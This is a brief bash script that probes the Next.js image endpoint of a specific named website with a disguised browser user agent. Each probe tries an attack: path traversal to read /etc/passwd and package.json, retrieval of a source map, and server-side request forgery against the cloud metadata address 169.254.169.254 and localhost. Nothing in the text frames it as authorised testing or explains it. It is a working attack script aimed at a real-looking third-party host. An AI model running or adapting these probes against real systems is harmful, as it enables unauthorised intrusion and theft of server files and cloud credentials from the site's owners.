#!/bin/bash
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
t(){ echo "--- $1"; curl -sk -A "$UA" -o /tmp/i.bin -D /tmp/i.hdr -w "code=%{http_code} size=%{size_download} type=%{content_type}\n" "https://www.infinitycapital.bh/_next/image?url=$1&w=1080&q=75"; grep -iE 'x-matched-path|content-type|x-nextjs' /tmp/i.hdr | head -3; head -c 160 /tmp/i.bin | tr -d '\0'; echo; }
t "%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
t "%2F..%2F..%2Fpackage.json"
t "%2F_next%2Fstatic%2Fchunks%2Fwebpack-e401313d27ef7f61.js.map"
t "%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
t "%2F%2F127.0.0.1%3A3000%2F"
